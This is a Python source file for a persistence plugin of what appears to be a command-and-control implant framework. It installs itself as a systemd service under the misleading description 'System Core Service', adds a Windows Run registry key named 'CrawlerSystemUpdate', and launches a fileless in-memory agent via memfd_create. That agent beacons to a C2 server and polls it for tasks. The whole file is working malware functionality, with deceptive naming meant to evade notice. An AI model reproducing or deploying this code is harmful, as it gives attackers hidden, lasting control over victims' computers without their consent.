import os
import platform
import sys
import subprocess
import getpass
import ctypes

class Persistence:
    """
    A plugin to establish persistence on the target system.
    Supports Windows (Registry), Linux (systemd), and Linux fileless (memfd).
    """

    def run(self, args: dict):
        method = args.get("method", "default")
        dry_run = args.get("dry_run", False)

        try:
            if platform.system() == "Linux":
                if method == "fileless":
                    return self._persist_linux_fileless()
                else: # Default to systemd
                    return self._persist_linux_systemd(dry_run)
            elif platform.system() == "Windows":
                return self._persist_windows_registry(dry_run)
            else:
                return {"status": "error", "message": f"Unsupported OS: {platform.system()}"}
        except Exception as e:
            return {"status": "error", "message": f"Failed to establish persistence: {e}"}

    def _get_minimal_agent_source(self):
        # This is a simplified, self-contained agent script. In a real scenario,
        # this would need to be the full agent code.
        # We can't easily read sys.argv[0] as it points to pytest.
        # We also need the C2 URL, which the plugin doesn't have.
        # This is a limitation of this PoC. We'll hardcode it for the test.
        c2_url = "http://127.0.0.1:8888/api"

        agent_script_template = """
import requests
import time
import platform
import os
import json

C2_URL = "{c2_url}"
BEACON_INTERVAL = 5

def register():
    payload = {{\"hostname\": f"fileless-{{platform.node()}}", "os": "In-Memory Linux", "pid": os.getpid()}}
    try:
        r = requests.post(f"{{C2_URL}}/register", json=payload, timeout=10)
        r.raise_for_status()
        return r.json()
    except Exception:
        return None

def beacon(token):
    if not token: return
    headers = {{\"Authorization\": f"Bearer {{token}}"}}
    try:
        requests.get(f"{{C2_URL}}/tasks", headers=headers, timeout=5)
    except Exception:
        pass

config = register()
token = config.get('token') if config else None
while True:
    beacon(token)
    time.sleep(BEACON_INTERVAL)
"""
        return agent_script_template.format(c2_url=c2_url)

    def _persist_linux_fileless(self):
        """Establishes fileless persistence on Linux using memfd_create."""
        if platform.system() != "Linux":
            return {"status": "error", "message": "Fileless persistence with memfd is only supported on Linux."}

        try:
            # Define constants and syscall numbers from the kernel source
            # Available in kernels >= 3.17
            SYS_memfd_create = 319

            # MFD_CLOEXEC cannot be used if we want the fd to survive the execve call.
            # MFD_CLOEXEC = 0x0001

            # Load libc
            libc = ctypes.CDLL(None)

            # Get agent source code
            agent_code = self._get_minimal_agent_source()
            agent_code_bytes = agent_code.encode('utf-8')

            # Call memfd_create without MFD_CLOEXEC
            # int memfd_create(const char *name, unsigned int flags);
            fd = libc.syscall(SYS_memfd_create, "crawler_agent", 0)
            if fd == -1:
                return {"status": "error", "message": "memfd_create syscall failed."}

            # Write agent code to the in-memory file descriptor
            os.write(fd, agent_code_bytes)

            # Fork the process to create a new agent instance
            pid = os.fork()

            if pid == 0: # Child process
                # We are now in the child process, which will become the new agent

                # The child process will execute the agent from the in-memory file.
                # We use the /proc/self/fd/ path to treat the file descriptor as a file.
                proc_path = f"/proc/self/fd/{fd}"

                # Arguments for the new process: python interpreter, script path
                argv = [sys.executable, proc_path]

                # os.execve replaces the current process (the child)
                os.execve(sys.executable, argv, os.environ)

                # This line should not be reached if execve is successful
                os._exit(1)

            else: # Parent process
                # The parent (original agent) can now close its copy of the fd
                os.close(fd)
                return {"status": "success", "message": f"Successfully launched fileless agent with PID: {pid}"}

        except Exception as e:
            return {"status": "error", "message": f"Fileless persistence failed: {e}"}


    def _get_executable_path(self):
        return os.path.abspath(sys.argv[0])

    def _persist_linux_systemd(self, dry_run: bool):
        """Creates a systemd service for persistence on Linux."""
        service_name = "crawler-agent.service"
        script_path = self._get_executable_path()
        python_executable = sys.executable

        service_content = f"""[Unit]
Description=System Core Service (Crawler)
After=network.target

[Service]
ExecStart={python_executable} {script_path}
Restart=always
User={getpass.getuser()}

[Install]
WantedBy=multi-user.target
"""

        if dry_run:
            return {"status": "dry_run", "message": service_content}

        service_path = f"/etc/systemd/system/{service_name}"
        try:
            with open(service_path, "w") as f:
                f.write(service_content)

            subprocess.run(["systemctl", "daemon-reload"], check=True, capture_output=True)
            subprocess.run(["systemctl", "enable", service_name], check=True, capture_output=True)
            subprocess.run(["systemctl", "start", service_name], check=True, capture_output=True)
            return {"status": "success", "message": f"Successfully created and enabled systemd service at {service_path}"}
        except PermissionError:
            return {"status": "error", "message": "Root privileges are required to create a systemd service."}
        except Exception as e:
            return {"status": "error", "message": f"Error creating systemd service: {e}"}

    def _persist_windows_registry(self, dry_run: bool):
        """Creates a registry run key for persistence on Windows."""
        try:
            import winreg
        except ImportError:
            return {"status": "error", "message": "Cannot establish persistence on Windows: 'winreg' module not found."}

        script_path = self._get_executable_path()
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "CrawlerSystemUpdate"

        if dry_run:
            return {"status": "dry_run", "message": f"Would add REG_SZ value '{script_path}' to HKEY_CURRENT_USER\\{key_path}\\{key_name}"}

        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, script_path)
            return {"status": "success", "message": "Successfully added persistence key to registry."}
        except Exception as e:
            return {"status": "error", "message": f"Error setting registry key: {e}"}

def load():
    """Entry point for the plugin loader."""
    return Persistence()
